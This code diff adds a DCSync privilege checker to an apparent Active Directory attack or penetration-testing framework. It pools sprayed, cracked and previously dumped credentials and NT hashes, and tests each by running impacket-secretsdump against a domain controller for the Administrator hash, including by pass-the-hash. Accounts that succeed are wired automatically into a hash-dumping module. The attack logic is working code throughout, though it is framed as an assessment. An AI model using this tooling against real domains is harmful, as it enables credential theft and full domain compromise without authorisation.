@@ -31,6 +31,7 @@ try:
     from rich.prompt import Prompt
     from rich.table import Table
     from rich import box
+    from rich.progress import Progress, SpinnerColumn, TextColumn
     _RICH = True
     console = Console()
 except ImportError:
@@ -286,7 +287,237 @@ class DCSyncModule:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Convenience wrapper
+# DCSync privilege checker
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Markers that indicate the account DOES have DCSync rights
+_SUCCESS_MARKERS = [":::"]  # hash lines always contain :::
+
+# Markers that indicate explicit access denial
+_DENY_MARKERS = [
+    "access_denied", "access denied",
+    "drsuapi", "status_access_denied",
+    "kdc_err", "error 5", "[-] error",
+    "rpc_s_access_denied",
+]
+
+
+def _build_cred_pool(state: AssessmentState) -> list[dict]:
+    """Collect all testable credentials from the session."""
+    pool: list[dict] = []
+
+    def _add(u: str, p: str, h: str, src: str) -> None:
+        if not u:
+            return
+        if not (p or h):
+            return
+        if any(c["username"] == u and c.get("password") == p and c.get("nt") == h for c in pool):
+            return
+        pool.append({"username": u, "password": p, "nt": h, "source": src})
+
+    for vc in getattr(state, "valid_credentials", []):
+        _add(vc.get("username", ""), vc.get("password", ""),
+             vc.get("ntlm_hash", ""), "spray/valid")
+
+    for cp in getattr(state, "cracked_passwords", []):
+        _add(cp.get("username", ""), cp.get("password", ""), "", "cracked")
+
+    ic = state.initial_credentials
+    if ic and ic.username:
+        _add(ic.username, ic.password, ic.ntlm_hash, "session")
+
+    # NT hashes from a previous DCSync run can themselves be tested for PTH
+    for nh in getattr(state, "ntlm_hashes", []):
+        _add(nh.get("username", ""), "", nh.get("nt", ""), "dcsync-nt")
+
+    return pool
+
+
+def _test_one_credential(
+    binary: str,
+    cred: dict,
+    state: AssessmentState,
+    executor: CommandExecutor,
+) -> str:
+    """
+    Run a quick -just-dc-user probe.
+
+    Returns
+    -------
+    str  — one of:  "capable" | "denied" | "error"
+    """
+    username = cred["username"]
+    password = cred["password"]
+    nt_hash  = cred["nt"]
+
+    if nt_hash:
+        cmd = [
+            binary,
+            f"{state.domain}/{username}@{state.target_ip}",
+            "-hashes", f":{nt_hash}",
+            "-just-dc-user", "Administrator",
+            "-no-pass",
+        ]
+    else:
+        cmd = [
+            binary,
+            f"{state.domain}/{username}:{password}@{state.target_ip}",
+            "-just-dc-user", "Administrator",
+        ]
+
+    result = executor.run(cmd, timeout=12, ok_exit_codes=(0, 1))
+    combined = (result.get("output", "") + " " + result.get("error", "")).lower()
+
+    if any(m in combined for m in _SUCCESS_MARKERS):
+        return "capable"
+    if any(m in combined for m in _DENY_MARKERS):
+        return "denied"
+    if result.get("status") == "error" or not combined.strip():
+        return "error"
+    return "denied"   # fallback — no hash, no explicit error = no rights
+
+
+def check_dcsync_privilege(
+    state: AssessmentState,
+    executor: Optional[CommandExecutor] = None,
+) -> dict:
+    """
+    Test every session credential for DCSync (Replicating Directory Changes) rights.
+
+    Uses:  impacket-secretsdump … -just-dc-user Administrator
+    Each probe has a 12-second timeout so the whole check stays fast.
+
+    Returns
+    -------
+    dict
+        {
+          "capable": list[dict],   # credentials that CAN DCSync
+          "denied":  list[dict],   # credentials that cannot
+          "errors":  list[dict],   # credentials that timed out / failed
+          "error":   str | None,   # top-level error (no tool, no creds)
+        }
+    """
+    ex = executor or CommandExecutor(verbose=False)
+
+    # Tool check
+    binary = _detect_secretsdump(ex)
+    if not binary:
+        return {
+            "capable": [], "denied": [], "errors": [],
+            "error": "impacket-secretsdump not found. Install: pip install impacket",
+        }
+
+    pool = _build_cred_pool(state)
+    if not pool:
+        return {
+            "capable": [], "denied": [], "errors": [],
+            "error": "No credentials in session to test.",
+        }
+
+    capable: list[dict] = []
+    denied:  list[dict] = []
+    errors:  list[dict] = []
+
+    console.print()
+    console.rule("[bold bright_cyan]DCSync Privilege Check[/bold bright_cyan]")
+    console.print(f"  [dim]Testing {len(pool)} credential(s) against {state.target_ip} — "
+                  "10 s timeout each…[/dim]\n")
+
+    for cred in pool:
+        label = cred["username"]
+        with Progress(
+            SpinnerColumn(style="bold cyan"),
+            TextColumn(f"  Testing [bold yellow]{label}[/bold yellow]…"),
+            console=console,
+            transient=True,
+        ) as prog:
+            prog.add_task("", total=None)
+            outcome = _test_one_credential(binary, cred, state, ex)
+
+        if outcome == "capable":
+            capable.append(cred)
+        elif outcome == "denied":
+            denied.append(cred)
+        else:
+            errors.append(cred)
+
+    # ── Results table ─────────────────────────────────────────────────────
+    tbl = Table(
+        title="[bold bright_cyan]DCSync Privilege Results[/bold bright_cyan]",
+        box=box.ROUNDED,
+        border_style="bright_blue",
+        show_lines=True,
+        expand=False,
+    )
+    tbl.add_column("Username",  style="bold yellow",     width=26)
+    tbl.add_column("Source",    style="bright_blue",     width=14)
+    tbl.add_column("DCSync",    style="bold",            width=10)
+    tbl.add_column("Auth",      style="dim",             width=8)
+
+    def _auth_label(c: dict) -> str:
+        return "NTLM" if c["nt"] else "pass"
+
+    for c in capable:
+        tbl.add_row(
+            c["username"], c["source"],
+            "[bold green]✔  YES[/bold green]",
+            _auth_label(c),
+        )
+    for c in denied:
+        tbl.add_row(
+            c["username"], c["source"],
+            "[red]✘  NO[/red]",
+            _auth_label(c),
+        )
+    for c in errors:
+        tbl.add_row(
+            c["username"], c["source"],
+            "[yellow]?  ERR[/yellow]",
+            _auth_label(c),
+        )
+
+    console.print(tbl)
+    console.print()
+
+    if capable:
+        console.print(
+            f"  [bold green]✔  {len(capable)} account(s) can DCSync — "
+            "credentials auto-wired to DCSync module.[/bold green]\n"
+        )
+        # Persist capable credentials so the DCSync module picks them up
+        for c in capable:
+            entry = {
+                "username":  c["username"],
+                "password":  c["password"],
+                "ntlm_hash": c["nt"],
+            }
+            if not any(
+                v.get("username") == c["username"] for v in state.valid_credentials
+            ):
+                state.valid_credentials.insert(0, entry)
+        state.log_finding(
+            "DCSync Privilege",
+            f"{len(capable)} account(s) confirmed with DCSync rights: "
+            + ", ".join(c['username'] for c in capable),
+            severity="CRITICAL",
+        )
+    else:
+        console.print(
+            "  [yellow]⚠  No accounts with DCSync rights found.\n"
+            "  Accounts that can DCSync typically need:[/yellow]\n"
+            "  [dim]  • Domain Admin membership, OR\n"
+            "  • 'Replicating Directory Changes All' ACE on the domain object[/dim]\n"
+        )
+
+    state.log_action(
+        f"DCSync privilege check — capable: {len(capable)}, "
+        f"denied: {len(denied)}, errors: {len(errors)}"
+    )
+    return {"capable": capable, "denied": denied, "errors": errors, "error": None}
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Convenience wrappers
 # ─────────────────────────────────────────────────────────────────────────────
 
 def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
@@ -295,3 +526,13 @@ def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> d
     result = dcsync_run(state)
     """
     return DCSyncModule(executor).run(state)
+
+
+def run_privilege_check(
+    state: AssessmentState, executor: Optional[CommandExecutor] = None
+) -> dict:
+    """
+    from modules.dcsync_module import run_privilege_check as dc_check
+    result = dc_check(state)
+    """
+    return check_dcsync_privilege(state, executor)
